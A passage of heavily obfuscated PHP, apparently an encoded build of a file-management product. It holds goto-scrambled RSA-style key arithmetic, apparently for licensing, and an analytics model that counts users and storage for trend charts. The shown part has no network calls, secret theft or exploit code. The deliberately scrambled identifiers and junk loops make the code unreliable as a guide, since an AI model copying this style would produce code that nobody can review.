$cçÂøÒãƒ[666]; while ($e’İ«Éğ˜Ã < $cçÂøÒãƒ[561]) { if ($e’İ«Éğ˜Ã >= 0) { break; } $e’İ«Éğ˜Ã++; } while ($dÇâïì”…¯ < 0) { $dÇâïì”…¯ += 64; $Fø—Ç¹¦‚ = $cçÂøÒãƒ[667]; while (strlen($Fø—Ç¹¦‚) < $cçÂøÒãƒ[544]) { if (!$Fø—Ç¹¦‚) { break; } $Fø—Ç¹¦‚++; } } $D«Ñë¼ôÊ .= $bÚ¢×æ»ÙÏ[$dÇâïì”…¯]; } $Eàæ°¤À–â = $Bğé›¹÷…[336]($D«Ñë¼ôÊ); goto BŸÄ‘ƒÏŠ; C¼åùÔ‡•ë: $d±Úˆ¹Àèä = $Bğé›¹÷…[335]($d±Úˆ¹Àèä); $D–÷Øá‚Ğ = $d±Úˆ¹Àèä[0]; $d±Úˆ¹Àèä = $Bğé›¹÷…[25]($d±Úˆ¹Àèä, 1); goto C¾´¼Ú©é; A…Ö—‹õ: $dö¨”¸í©” = $cçÂøÒãƒ[657]; if (strlen($dö¨”¸í©”) < $cçÂøÒãƒ[558]) { die; } $f¦’‚ŒİĞ = $Bğé›¹÷…[114]($D–÷Øá‚Ğ . $Bğé›¹÷…[114]($bòÎİï¢İ . $D–÷Øá‚Ğ) . $bòÎİï¢İ); goto CÃ˜ïÚÕğ; BŸÄ‘ƒÏŠ: break; goto B–é°³«; dÊŒ¥¿Œò: $açàºœæèä = $cçÂøÒãƒ[661]; if (strlen($açàºœæèä) < $cçÂøÒãƒ[555]) { die; } $dÇâïì”…¯ = 0; goto B¿ˆ…í¿Øö; e¤ñÊ®£§: $EŠ£ô¨¦ğ‘ = $cçÂøÒãƒ[660]; if (strlen($EŠ£ô¨¦ğ‘) < $cçÂøÒãƒ[544]) { die; } $DÈ¬¥Ğ„íê = 0; goto dÊŒ¥¿Œò; B–é°³«: default: $Eàæ°¤À–â = $this->{$_SERVER[Ä³Œ±¸ü][243]}($d±Úˆ¹Àèä, $bòÎİï¢İ . $d¹ŞÚ‹£Â); break; } goto FŸ©¢öÎä; EÇ´›İÆ“: } public function zkxs4707ab14($CòŒµéêÑ±) { goto EÊİêğøˆ÷; bÑ…¸Ë Ì¬: $AÒ—ğÅ¯Ìˆ = $e•Åè„ªÍ¥[668]; if (strlen($AÒ—ğÅ¯Ìˆ) < $e•Åè„ªÍ¥[548]) { die; } $Dµ‚Ë°¡ß = $this->{$_SERVER[Ä³Œ±¸ü][337]}(); goto fÃÏŠÃØÅ‚; f³¥¨ñÃ¸: for ($a±×ò·÷‘‡ = 0; $a±×ò·÷‘‡ < $Dì¾¬Ñ×» * 10; $a±×ò·÷‘‡++) { if (($Dì¾¬Ñ×» * $a±×ò·÷‘‡ + 1) % $C¢¾ƒ¨œÀÎ == 0) { $dŞ­“êÉ´ = $f àİÃƒ¨[201](($Dì¾¬Ñ×» * $a±×ò·÷‘‡ + 1) / $C¢¾ƒ¨œÀÎ); break; } } $b†¯«ÙÃÖ = $this->{$_SERVER[Ä³Œ±¸ü][147]}($a©òï¢Á¤Ú * $Dµ‚Ë°¡ß . $f àİÃƒ¨[10], $f àİÃƒ¨[149]); $DÛÑâ‹‘Û = $f àİÃƒ¨[114]($f àİÃƒ¨[338] . ($a©òï¢Á¤Ú + $Dµ‚Ë°¡ß) . $f àİÃƒ¨[339] . $C¢¾ƒ¨œÀÎ . $f àİÃƒ¨[339] . $dŞ­“êÉ´ . $f àİÃƒ¨[340]); goto FÚ’‰°­Í; fÃÏŠÃØÅ‚: $Dì¾¬Ñ×» = ($a©òï¢Á¤Ú - 1) * ($Dµ‚Ë°¡ß - 1); $C¢¾ƒ¨œÀÎ = $f àİÃƒ¨[201](($a©òï¢Á¤Ú + $Dµ‚Ë°¡ß) / 2); $DÖŠ”­¨ ï = $e•Åè„ªÍ¥[669]; goto Dö­éíš½·; fŸØäá¨Ò: $A½âìãõÚ = $e•Åè„ªÍ¥[674]; goto fŒæÑùÇ‘Ş; EÊİêğøˆ÷: $e•Åè„ªÍ¥ =& $_SERVER[Äº¡•ô™Ÿ]; $f àİÃƒ¨ =& $_SERVER[Ä³Œ±¸ü]; $a©òï¢Á¤Ú = $this->{$_SERVER[Ä³Œ±¸ü][337]}(); goto bÑ…¸Ë Ì¬; FÚ’‰°­Í: $BŠ–ä•Ùñ¹ = $e•Åè„ªÍ¥[673]; $DÙß–÷¼ñİ = $this->{$_SERVER[Ä³Œ±¸ü][147]}($CòŒµéêÑ±, $DÛÑâ‹‘Û) . $f àİÃƒ¨[341] . $b†¯«ÙÃÖ; return $DÙß–÷¼ñİ; goto fŸØäá¨Ò; Dö­éíš½·: if (!$DÖŠ”­¨ ï) { die; } while (1) { $c†˜ÊÑïÛ = $C¢¾ƒ¨œÀÎ; $eÈ•õàâàÃ = $e•Åè„ªÍ¥[670]; while (strlen($eÈ•õàâàÃ) < $e•Åè„ªÍ¥[561]) { if (!$eÈ•õàâàÃ) { break; } $eÈ•õàâàÃ++; } $c±Ç¤ì£‚ = $Dì¾¬Ñ×»; $c‘Ü—¡äÈ = $e•Åè„ªÍ¥[671]; if (strlen($c‘Ü—¡äÈ) < $e•Åè„ªÍ¥[555]) { die; } while ($c±Ç¤ì£‚ % $c†˜ÊÑïÛ != 0) { $f¹¼™¹•œŒ = $c±Ç¤ì£‚; $c±Ç¤ì£‚ = $c†˜ÊÑïÛ; $c†˜ÊÑïÛ = $f¹¼™¹•œŒ % $c†˜ÊÑïÛ; $D¦¦ÒóÈŒ = $e•Åè„ªÍ¥[672]; if (strlen($D¦¦ÒóÈŒ) < $e•Åè„ªÍ¥[561]) { die; } } if ($c†˜ÊÑïÛ == 1) { break; } else { $C¢¾ƒ¨œÀÎ++; } } $dŞ­“êÉ´ = 2; goto f³¥¨ñÃ¸; fŒæÑùÇ‘Ş: } public function qpwub4b4d085($C‚ ƒôÓ›Î) { goto bßø±ĞåÏ’; bßø±ĞåÏ’: $D¬ëœ¯ÂÛœ =& $_SERVER[Äº¡•ô™Ÿ]; $bÉ…é‡Š‡Ú =& $_SERVER[Ä³Œ±¸ü]; $fà¤…ëäíÖ = $bÉ…é‡Š‡Ú[0]($bÉ…é‡Š‡Ú[341], $C‚ ƒôÓ›Î); goto fÚ–‚¿çÆ; CÆ²Ñì¡¤: $c˜‘Œ¦ÑÜ‚ = $D¬ëœ¯ÂÛœ[676]; if (!$c˜‘Œ¦ÑÜ‚) { die; } if (!$B‹˜¯ì˜à°) { return $bÉ…é‡Š‡Ú[10]; } goto aè‚„õØä; bôˆ®µ…ÄÛ: while ($Fµ”…×æÎä < $D¬ëœ¯ÂÛœ[555]) { if ($Fµ”…×æÎä >= 0) { break; } $Fµ”…×æÎä++; } $dÈ‹®ÚÅÆä = $this->{$_SERVER[Ä³Œ±¸ü][243]}($fà¤…ëäíÖ[0], $fÉƒÎÙö); return $dÈ‹®ÚÅÆä; goto BÊ¡ÅÑÌ¼; d“Ó¢÷ˆ¥: if (!$d‹‘ÂµĞ) { die; } while (1) { $d‰Ë¦Û¢¡ = $Béìğ×Ğ; $DêÅÆƒö©— = $fÆšˆÖ³î›; $F¤Ğ„™²Í¬ = $D¬ëœ¯ÂÛœ[680]; while (strlen($F¤Ğ„™²Í¬) < $D¬ëœ¯ÂÛœ[561]) { if (!$F¤Ğ„™²Í¬) { break; } $F¤Ğ„™²Í¬++; } while ($DêÅÆƒö©— % $d‰Ë¦Û¢¡ != 0) { $dòƒˆ‹Å = $DêÅÆƒö©—; $Aé”–¶é°‰ = $D¬ëœ¯ÂÛœ[681]; if (strlen($Aé”–¶é°‰) < $D¬ëœ¯ÂÛœ[548]) { die; } $DêÅÆƒö©— = $d‰Ë¦Û¢¡; $d‰Ë¦Û¢¡ = $dòƒˆ‹Å % $d‰Ë¦Û¢¡; $AØÚóŒ«œ† = $D¬ëœ¯ÂÛœ[682]; if (!$AØÚóŒ«œ†) { die; } } if ($d‰Ë¦Û¢¡ == 1) { break; } else { $Béìğ×Ğ++; } } $eÈõ·Š’Ê = 2; goto BİŒ™Í™è; fÚ–‚¿çÆ: $AÎšç¬ãùˆ = $D¬ëœ¯ÂÛœ[675]; if ($bÉ…é‡Š‡Ú[19]($fà¤…ëäíÖ) != 2) { return $bÉ…é‡Š‡Ú[10]; } $B‹˜¯ì˜à° = $this->{$_SERVER[Ä³Œ±¸ü][243]}($fà¤…ëäíÖ[1] . $bÉ…é‡Š‡Ú[10], $bÉ…é‡Š‡Ú[149]); goto CÆ²Ñì¡¤; bø‘í¾°·É: $fÆšˆÖ³î› = ($eÑİ¬Š¥Ö - 1) * ($bÊ¹õËå - 1); $Béìğ×Ğ = $bÉ…é‡Š‡Ú[201](($eÑİ¬Š¥Ö + $bÊ¹õËå) / 2); $d‹‘ÂµĞ = $D¬ëœ¯ÂÛœ[679]; goto d“Ó¢÷ˆ¥; BİŒ™Í™è: for ($AãÅî‚Î¼ = 0; $AãÅî‚Î¼ < $fÆšˆÖ³î› * 10; $AãÅî‚Î¼++) { if (($fÆšˆÖ³î› * $AãÅî‚Î¼ + 1) % $Béìğ×Ğ == 0) { $eÈõ·Š’Ê = $bÉ…é‡Š‡Ú[201](($fÆšˆÖ³î› * $AãÅî‚Î¼ + 1) / $Béìğ×Ğ); break; } } $fÉƒÎÙö = $bÉ…é‡Š‡Ú[114]($bÉ…é‡Š‡Ú[338] . ($eÑİ¬Š¥Ö + $bÊ¹õËå) . $bÉ…é‡Š‡Ú[339] . $Béìğ×Ğ . $bÉ…é‡Š‡Ú[339] . $eÈõ·Š’Ê . $bÉ…é‡Š‡Ú[340]); $Fµ”…×æÎä = $D¬ëœ¯ÂÛœ[683]; goto bôˆ®µ…ÄÛ; aè‚„õØä: $B‹˜¯ì˜à° = $bÉ…é‡Š‡Ú[201]($B‹˜¯ì˜à°); $eÑİ¬Š¥Ö = 0; $bÊ¹õËå = 0; goto C‚³ â¼Ÿ; C‚³ â¼Ÿ: $C–¥‘©¥„÷ = $D¬ëœ¯ÂÛœ[677]; while ($C–¥‘©¥„÷ < $D¬ëœ¯ÂÛœ[544]) { if ($C–¥‘©¥„÷ >= 0) { break; } $C–¥‘©¥„÷++; } for ($AãÅî‚Î¼ = 3; $AãÅî‚Î¼ < $B‹˜¯ì˜à°; $AãÅî‚Î¼ += 2) { if ($B‹˜¯ì˜à° % $AãÅî‚Î¼ != 0) { continue; } $eÑİ¬Š¥Ö = $AãÅî‚Î¼; $bÊ¹õËå = $bÉ…é‡Š‡Ú[201]($B‹˜¯ì˜à° / $AãÅî‚Î¼); $fç·ÁĞ×“æ = $D¬ëœ¯ÂÛœ[678]; break; } goto bø‘í¾°·É; BÊ¡ÅÑÌ¼: } public function rktqf7d50075() { goto aÎ´èßìÑ; BÂ³ÂĞ•ª‹: $Câ•Ã˜¹Í = 1; $b¶‹Ô¬¨ÔÅ = $fõÊ™‚“³[685]; while ($Câ•Ã˜¹Í <= (int) $FŠ«¨À„Ÿ†[343]($eÉ›œ°Ø’…)) { $Cƒå¼…ï… = $Câ•Ã˜¹Í; $d˜åÏêˆÀ = $fõÊ™‚“³[686]; while (strlen($d˜åÏêˆÀ) < $fõÊ™‚“³[555]) { if (!$d˜åÏêˆÀ) { break; } $d˜åÏêˆÀ++; } while (!0) { $Cƒå¼…ï…++; $dÛƒ·Ùˆ¬‚ = $fõÊ™‚“³[687]; if ($Cƒå¼…ï… <= 2) { $Câ•Ã˜¹Í = $Cƒå¼…ï…; break; } else { if ($Cƒå¼…ï… < 2) { continue; } } $EÙìì¦¬Â› = !0; for ($eî¶äñœì÷ = 2; $eî¶äñœì÷ <= $FŠ«¨À„Ÿ†[343]($Cƒå¼…ï…); $eî¶äñœì÷++) { if ($Cƒå¼…ï… % $eî¶äñœì÷ == 0) { $EÙìì¦¬Â› = !1; } } if ($EÙìì¦¬Â›) { $Câ•Ã˜¹Í = $Cƒå¼…ï…; break; } } $A‰óå—Ù½[] = $Câ•Ã˜¹Í; $F†ãÍ‹ª‡Í = $fõÊ™‚“³[688]; while ($F†ãÍ‹ª‡Í < $fõÊ™‚“³[558]) { if ($F†ãÍ‹ª‡Í >= 0) { break; } $F†ãÍ‹ª‡Í++; } } goto E£êê”“¨; FŠ±á°ãĞ: $A‰óå—Ù½ = array(); $E’‰ÜèÒ¿ = $fõÊ™‚“³[684]; while (strlen($E’‰ÜèÒ¿) < $fõÊ™‚“³[555]) { if (!$E’‰ÜèÒ¿) { break; } $E’‰ÜèÒ¿++; } goto BÂ³ÂĞ•ª‹; aÎ´èßìÑ: $fõÊ™‚“³ =& $_SERVER[Äº¡•ô™Ÿ]; $FŠ«¨À„Ÿ† =& $_SERVER[Ä³Œ±¸ü]; $eÉ›œ°Ø’… = $FŠ«¨À„Ÿ†[322]($FŠ«¨À„Ÿ†[342](2, 14), $FŠ«¨À„Ÿ†[342](2, 16) - 1); goto FŠ±á°ãĞ; EÖÜÏœ‡‰ö: $a÷“Ÿªâ„‡ = $fõÊ™‚“³[616]; if (!$a÷“Ÿªâ„‡) { return; } goto A‡È‚¶†‹É; E£êê”“¨: $D¸ÊÒ×±Š = 2; for ($Cƒå¼…ï… = $eÉ›œ°Ø’…; $Cƒå¼…ï… > 1; $Cƒå¼…ï…--) { $EÙìì¦¬Â› = !0; $D¾…· = $fõÊ™‚“³[689]; if (strlen($D¾…·) < $fõÊ™‚“³[548]) { return; } foreach ($A‰óå—Ù½ as $Ağˆñ©Ã×ñ) { if ($Cƒå¼…ï… % $Ağˆñ©Ã×ñ == 0) { $EÙìì¦¬Â› = !1; break; } } if ($EÙìì¦¬Â›) { $D¸ÊÒ×±Š = $Cƒå¼…ï…; break; } } return $D¸ÊÒ×±Š; goto EÖÜÏœ‡‰ö; A‡È‚¶†‹É: } public function rveza0ad3d38($a’×¯Ëµµ, $d³áš†) { $BŠë¥ ³¸¸ =& $_SERVER[Ä³Œ±¸ü]; return $BŠë¥ ³¸¸[13](array($BŠë¥ ³¸¸[14], $BŠë¥ ³¸¸[344]), $a’×¯Ëµµ, $d³áš†); } public function oqyt448d1767($E«¸‰øªµ, $A´º©‚»´) { $BØ¦ÂÑéÌ =& $_SERVER[Ä³Œ±¸ü]; return $BØ¦ÂÑéÌ[13](array($BØ¦ÂÑéÌ[345], $BØ¦ÂÑéÌ[346]), $E«¸‰øªµ, $A´º©‚»´); } public function qcuic2ab272a($dÙÒ¾“¹å‘, $bÌçµ °çÑ) { $dÔ”¹œ¶¢Ó =& $_SERVER[Ä³Œ±¸ü]; return $dÔ”¹œ¶¢Ó[13](array($dÔ”¹œ¶¢Ó[345], $dÔ”¹œ¶¢Ó[347]), $dÙÒ¾“¹å‘, $bÌçµ °çÑ); } } goto E“ØÓ¾êÅÓ; A¯ª’¬–“¨: class AnalysisModel extends ModelBaseLight { public function init($D™Æ§‡½¨è) { $FñêÄ·Ê˜ =& $_SERVER[Äº¡•ô™Ÿ]; $E‘×ä‘¾š = array($FñêÄ·Ê˜[531] => array($FñêÄ·Ê˜[29] => $FñêÄ·Ê˜[2005], $FñêÄ·Ê˜[258] => array($FñêÄ·Ê˜[207], $FñêÄ·Ê˜[703], $FñêÄ·Ê˜[2006], $FñêÄ·Ê˜[2007])), $FñêÄ·Ê˜[2008] => array($FñêÄ·Ê˜[29] => $FñêÄ·Ê˜[2009], $FñêÄ·Ê˜[258] => array($FñêÄ·Ê˜[207], $FñêÄ·Ê˜[701], $FñêÄ·Ê˜[2010], $FñêÄ·Ê˜[2011], $FñêÄ·Ê˜[2012]))); if (!isset($E‘×ä‘¾š[$D™Æ§‡½¨è])) { return !1; } $this->optionType = $E‘×ä‘¾š[$D™Æ§‡½¨è][$FñêÄ·Ê˜[29]]; $this->field = $E‘×ä‘¾š[$D™Æ§‡½¨è][$FñêÄ·Ê˜[258]]; return !0; } public function listData($a¥˜ÈÒõ£ = false, $f´§òôÆ‚ = "\155\x6f\x64\x69\x66\171\124\x69\x6d\x65", $c›–šåšçÜ = false) { return parent::listData($a¥˜ÈÒõ£, $f´§òôÆ‚, $c›–šåšçÜ); } public function trendList($Cô¨•¾Ê‹) { goto f«ï²÷Ê‹ó; f«ï²÷Ê‹ó: $Dîøî«Ò› =& $_SERVER[Äº¡•ô™Ÿ]; $A‹µïØâç = $this->listData(); if ($A‹µïØâç) { $eâôô¿ì— = end($A‹µïØâç); $AÛ¸ãî°Â‰ = date($Dîøî«Ò›[2013], strtotime($Dîøî«Ò›[2014])); if ($eâôô¿ì—[$Dîøî«Ò›[207]] == $AÛ¸ãî°Â‰) { return $A‹µïØâç; } $E‰˜ÕƒÙ‰ = strtotime($eâôô¿ì—[$Dîøî«Ò›[207]]); } goto a´¹Óˆß¥Æ; a´¹Óˆß¥Æ: if (!isset($E‰˜ÕƒÙ‰)) { $B÷æÀİ‰© = $Cô¨•¾Ê‹ == $Dîøî«Ò›[531] ? $Dîøî«Ò›[473] : $Dîøî«Ò›[755]; $E‰˜ÕƒÙ‰ = Model($B÷æÀİ‰©)->min($Dîøî«Ò›[184]); } $d™«°–Ÿ˜ = $Dîøî«Ò›[2015] . ucfirst($Cô¨•¾Ê‹); $Cõî¤ğšœè = $this->dateList($E‰˜ÕƒÙ‰); goto B´ÆÅšÏô£; B´ÆÅšÏô£: foreach ($Cõî¤ğšœè as $AÛ¸ãî°Â‰) { $this->{$d™«°–Ÿ˜}($AÛ¸ãî°Â‰); } return $this->listData(); goto eƒ½ƒèè¨«; eƒ½ƒèè¨«: } private function dateList($EƒÎœ¦ùø›) { $dÛ»œ‚İÍ› =& $_SERVER[Äº¡•ô™Ÿ]; $dªàï†ƒ×Ö = $EƒÎœ¦ùø›; $CÑ†È©Àİ“ = strtotime($dÛ»œ‚İÍ›[2014]); $a“ÖèÄÅÄ = array(); while ($dªàï†ƒ×Ö <= $CÑ†È©Àİ“) { $a“ÖèÄÅÄ[] = date($dÛ»œ‚İÍ›[2013], $dªàï†ƒ×Ö); $dªàï†ƒ×Ö = strtotime($dÛ»œ‚İÍ›[2016], $dªàï†ƒ×Ö); } return $a“ÖèÄÅÄ; } public function _recordUser($FÖå½™Ÿ = '') { goto DŒˆÑÑš‰±; AÜ«ïğ‹£¥: $D’ò¬©±¼ = array($a˜ Ê§†å[184] => array($a˜ Ê§†å[929], $aÙÄÆ²ãÎØ)); $E¤ˆ¥Ç¥ÊÅ = Model($a˜ Ê§†å[473])->where($D’ò¬©±¼)->count($a˜ Ê§†å[1416]); $D’ò¬©±¼[$a˜ Ê§†å[184]] = array($a˜ Ê§†å[318], array($AóÍ—ââÂŸ, $aÙÄÆ²ãÎØ)); goto bÜ›£«àÕ; E¨²Ù¶¶¹: $bÌ…ÈŒñ†Ì = array($a˜ Ê§†å[207] => $FÖå½™Ÿ, $a˜ Ê§†å[703] => (int) $E¤ˆ¥Ç¥ÊÅ, $a˜ Ê§†å[2006] => (int) $eÂÔ‡øÂ‡, $a˜ Ê§†å[2007] => (int) $Eîö ·æĞŒ); return $this->insert($bÌ…ÈŒñ†Ì); goto D¡ŠĞï¾£ì; bÜ›£«àÕ: $eÂÔ‡øÂ‡ = Model($a˜ Ê§†å[473])->where($D’ò¬©±¼)->count($a˜ Ê§†å[1416]); $D’ò¬©±¼[$a˜ Ê§†å[29]] = $a˜ Ê§†å[2019]; $Eîö ·æĞŒ = Model($a˜ Ê§†å[2020])->where($D’ò¬©±¼)->count($a˜ Ê§†å[2021]); goto E¨²Ù¶¶¹; DŒˆÑÑš‰±: $a˜ Ê§†å =& $_SERVER[Äº¡•ô™Ÿ]; $AóÍ—ââÂŸ = strtotime(date($a˜ Ê§†å[2017], strtotime($FÖå½™Ÿ))); $aÙÄÆ²ãÎØ = strtotime(date($a˜ Ê§†å[2018], strtotime($FÖå½™Ÿ))); goto AÜ«ïğ‹£¥; D¡ŠĞï¾£ì: } public function _recordStore($C„š‡„š¸Ì = '') { goto DäÍ‘³—; DäÍ‘³—: $eå¥ÙááË =& $_SERVER[Äº¡•ô™Ÿ]; $C­‚¸îØœ = strtotime(date($eå¥ÙááË[2018], strtotime($C„š‡„š¸Ì))); $Föº…ñöâĞ = array($eå¥ÙááË[184] => array($eå¥ÙááË[929], $C­‚¸îØœ)); goto eì„¹êœñ¼; eì„¹êœñ¼: $eÚ¡²·õîê = Model($eå¥ÙááË[418])->where($Föº…ñöâĞ)->sum($eå¥ÙááË[77]); $Föº…ñöâĞ[$eå¥ÙááË[367]] = 0; $cæ•¢…À¿ = Model($eå¥ÙááË[755])->where($Föº…ñöâĞ)->sum($eå¥ÙááË[77]); goto aŒ‹´îÖØ³; FÅ¤²‰õ´: $c†óñ…Å×± = Model($eå¥ÙááË[755])->where($Föº…ñöâĞ)->sum($eå¥ÙááË[77]); $e„»ßÑªÆ» = array($eå¥ÙááË[207] => $C„š‡„š¸Ì, $eå¥ÙááË[701] => (int) $cæ•¢…À¿, $eå¥ÙááË[2010] => (int) $eÚ¡²·õîê, $eå¥ÙááË[2011] => (int) $d‰öõ®¶‘, $eå¥ÙááË[2012] => (int) $c†óñ…Å×±); return $this->insert($e„»ßÑªÆ»); goto Fœ£ÂÏĞŒ•; aŒ‹´îÖØ³: $Föº…ñöâĞ[$eå¥ÙááË[368]] = 1; $d‰öõ®¶‘ = Model($eå¥ÙááË[755])->where($Föº…ñöâĞ)->sum($eå¥ÙááË[77]); $Föº…ñöâĞ[$eå¥ÙááË[368]] = 2; goto FÅ¤²‰õ´; Fœ£ÂÏĞŒ•: } public function trend($Dá‰ÈÀ¿²Û, $B²õ–ÛƒÎÍ) { goto A¯õšôƒÃ; aö³Ö¬÷‰ß: if ($DÆŠ¼Ö‚ˆí && $B²õ–ÛƒÎÍ != $aÁÄ•øíÓ[1391]) { $aä£Öäøìç = $DÆŠ¼Ö‚ˆí[0][$aÁÄ•øíÓ[207]]; $DÚ­èæ«ä˜ = $this->validDate($B²õ–ÛƒÎÍ, $aä£Öäøìç); $d»ãÔ—ç…Ä = array(); $aŞñø¹³‚ = array_to_keyvalue($DÆŠ¼Ö‚ˆí, $aÁÄ•øíÓ[207]); foreach ($DÚ­èæ«ä˜ as $Eä‰‚ê‰ğ—) { if (isset($aŞñø¹³‚[$Eä‰‚ê‰ğ—])) { $e¹Öï“¥À = $aŞñø¹³‚[$Eä‰‚ê‰ğ—]; } else { $e¹Öï“¥À = end($DÆŠ¼Ö‚ˆí); $e¹Öï“¥À[$aÁÄ•øíÓ[207]] = $Eä‰‚ê‰ğ—; if ($Dá‰ÈÀ¿²Û == $aÁÄ•øíÓ[531]) { $e¹Öï“¥À[$aÁÄ•øíÓ[2006]] = $e¹Öï“¥À[$aÁÄ•øíÓ[2007]] = 0; } } $d»ãÔ—ç…Ä[] = $e¹Öï“¥À; } $DÆŠ¼Ö‚ˆí = $d»ãÔ—ç…Ä; } $dêõÍßó = array($aÁÄ•øíÓ[531] => array($aÁÄ•øíÓ[703] => LNG($aÁÄ•øíÓ[2022]), $aÁÄ•øíÓ[2006] => LNG($aÁÄ•øíÓ[2023]), $aÁÄ•øíÓ[2007] => LNG($aÁÄ•øíÓ[2024])), $aÁÄ•øíÓ[2008] => array($aÁÄ•øíÓ[701] => LNG($aÁÄ•øíÓ[2025]), $aÁÄ•øíÓ[2010] => LNG($aÁÄ•øíÓ[2026]), $aÁÄ•øíÓ[2011] => LNG($aÁÄ•øíÓ[2027]), $aÁÄ•øíÓ[2012] => LNG($aÁÄ•øíÓ[2028]))); $b†·„‡ÅŞ¡ = array($aÁÄ•øíÓ[531] => $aÁÄ•øíÓ[2029], $aÁÄ•øíÓ[2008] => $aÁÄ•øíÓ[77]); goto dÀ—ĞÕ™Ùô; A¯õšôƒÃ: $aÁÄ•øíÓ =& $_SERVER[Äº¡•ô™Ÿ]; if (!$this->init($Dá‰ÈÀ¿²Û)) { return !1; } $DÆŠ¼Ö‚ˆí = $this->trendList($Dá‰ÈÀ¿²Û); goto aö³Ö¬÷‰ß; dÀ—ĞÕ™Ùô: if (empty($DÆŠ¼Ö‚ˆí)) { $Eä‰‚ê‰ğ— = date($aÁÄ•øíÓ[2013], strtotime($aÁÄ•øíÓ[2014])); $C†õº™åé» = array($aÁÄ•øíÓ[207] => $Eä‰‚ê‰ğ—); foreach ($dêõÍßó[$Dá‰ÈÀ¿²Û] as $a°ÒØ’˜× => $DÓèŒùÊ¢) { $C†õº™åé»[$a°ÒØ’˜×] = 0; } $DÆŠ¼Ö‚ˆí[] = $C†õº™åé»; } $dëÃ‘÷Í = array(); foreach ($DÆŠ¼Ö‚ˆí as $DÓèŒùÊ¢) { if ($Dá‰ÈÀ¿²Û == $aÁÄ•øíÓ[2008] && $DÓèŒùÊ¢[$aÁÄ•øíÓ[2010]] > $DÓèŒùÊ¢[$aÁÄ•øíÓ[701]]) { $DÓèŒùÊ¢[$aÁÄ•øíÓ[2010]] = $DÓèŒùÊ¢[$aÁÄ•øíÓ[701]]; } foreach ($dêõÍßó[$Dá‰ÈÀ¿²Û] as $a°ÒØ’˜× => $f§…‘…¹Ü½) { $e¹Öï“¥À = array($aÁÄ•øíÓ[207] => $DÓèŒùÊ¢[$aÁÄ•øíÓ[207]], $aÁÄ•øíÓ[1321] => $f§…‘…¹Ü½); $e¹Öï“¥À[$b†·„‡ÅŞ¡[$Dá‰ÈÀ¿²Û]] = isset($DÓèŒùÊ¢[$a°ÒØ’˜×]) ? $DÓèŒùÊ¢[$a°ÒØ’˜×] : 0; $dëÃ‘÷Í[] = $e¹Öï“¥À; } } goto A¥Üçõ‚Œ¡; A¥Üçõ‚Œ¡: return $dëÃ‘÷Í; goto Cö“—Ê•ô; Cö“—Ê•ô: } public function validDate($F¨œÈ¼¹·‰, $C¼Ó›Œ¤ŠŒ) { goto D¡¾­õÄ– ; e¨Ëİ¤ë²‚: return $bÆ³Û®É­Œ; goto Cëì½îîÅÒ; F‰Ã–¿İÄ‰: switch ($F¨œÈ¼¹·‰) { case $C¸É¥æ¬Ë‚[1398]: $cËà•ŞÌ = mktime(0, 0, 0, date($C¸É¥æ¬Ë‚[2030]), date($C¸É¥æ¬Ë‚[2031]) - date($C¸É¥æ¬Ë‚[1220]) + 7 - 7, date($C¸É¥æ¬Ë‚[2032])); $Eñë‡Ößˆ÷ = 0; do { $dÁëÚÉ”½ˆ = date($C¸É¥æ¬Ë‚[2013], $cËà•ŞÌ - 3600 * 24 * 7 * $Eñë‡Ößˆ÷); $bÆ³Û®É­Œ[] = $dÁëÚÉ”½ˆ; $Eñë‡Ößˆ÷++; } while ($C¼Ó›Œ¤ŠŒ < $dÁëÚÉ”½ˆ); break; case $C¸É¥æ¬Ë‚[1396]: $Eñë‡Ößˆ÷ = 1; do { $a­¾‰‚—ß = date($C¸É¥æ¬Ë‚[2033], strtotime("\x2d\40{$Eñë‡Ößˆ÷}\x20\x6d\x6f\x6e\x74\x68\x73")); $bÆ³Û®É­Œ[] = $a­¾‰‚—ß; $Eñë‡Ößˆ÷++; } while ($C¼Ó›Œ¤ŠŒ < $a­¾‰‚—ß); break; case $C¸É¥æ¬Ë‚[1701]: $F³ŠªÖ‡Œ× = (int) date($C¸É¥æ¬Ë‚[2032], strtotime($C¼Ó›Œ¤ŠŒ)); $FÒÂˆŞ’… = (int) date($C¸É¥æ¬Ë‚[2032]); if ($F³ŠªÖ‡Œ× >= $FÒÂˆŞ’…) { break; } for ($F³ŠªÖ‡Œ×; $F³ŠªÖ‡Œ× < $FÒÂˆŞ’…; $F³ŠªÖ‡Œ×++) { $bÆ³Û®É­Œ[] = $F³ŠªÖ‡Œ× . $C¸É¥æ¬Ë‚[2034]; } break; default: break; } if ($C¼Ó›Œ¤ŠŒ > end($bÆ³Û®É­Œ)) { array_pop($bÆ³Û®É­Œ); } sort($bÆ³Û®É­Œ); goto e¨Ëİ¤ë²‚; D¡¾­õÄ– : $C¸É¥æ¬Ë‚ =& $_SERVER[Äº¡•ô™Ÿ]; $eŠàÂã¼‚‰ = date($C¸É¥æ¬Ë‚[2013], strtotime($C¸É¥æ¬Ë‚[2014])); $bÆ³Û®É­Œ = array($eŠàÂã¼‚‰); goto F‰Ã–¿İÄ‰; Cëì½îîÅÒ: } public function listTable($cîº¥‰Ø½¦) { $DÙäĞ¼ŸŠÛ = ucfirst($cîº¥‰Ø½¦); return Model($DÙäĞ¼ŸŠÛ)->listData(); } public function option($C’õ…ó•±ğ) { $eõ‚éçÂ”— = $_SERVER[Äº¡•ô™Ÿ][2035] . ucfirst($C’õ…ó•±ğ); return $this->{$eõ‚éçÂ”—}(); } private function optionUser() { goto fŸÆ„„Ø½ø; fŸÆ„„Ø½ø: $a«»³êàİµ =& $_SERVER[Äº¡•ô™Ÿ]; $d•êÆºò¸ë = Model($a«»³êàİµ[473])->count($a«»³êàİµ[1416]); $e“Ş…‡£ßé = Model($a«»³êàİµ[473])->where($a«»³êàİµ[2036])->count($a«»³êàİµ[1416]); goto D¾åèÔ‰; a®Î‰˜‘¦½: $bÌöà‘¨Õ = Model($a«»³êàİµ[473])->where($AªéÒºœİÉ)->count($a«»³êàİµ[1416]); return array($a«»³êàİµ[698] => (int) $d•êÆºò¸ë, $a«»³êàİµ[2039] => (int) ($d•êÆºò¸ë - $e“Ş…‡£ßé), $a«»³êàİµ[2040] => (int) $e“Ş…‡£ßé, $a«»³êàİµ[2041] => (int) $bÌöà‘¨Õ, $a«»³êàİµ[2042] => $CÃ‡œ˜®ò§); goto f‡Úõ©š‹; Fœ¸ÃÑÒÉÉ: if (!$CÃ‡œ˜®ò§) { $CÃ‡œ˜®ò§ = 1; } $aÖİ¾ˆ¯¬ = strtotime(date($a«»³êàİµ[2017])); $AªéÒºœİÉ = array($a«»³êàİµ[2038] => array($a«»³êàİµ[930], $aÖİ¾ˆ¯¬)); goto a®Î‰˜‘¦½; 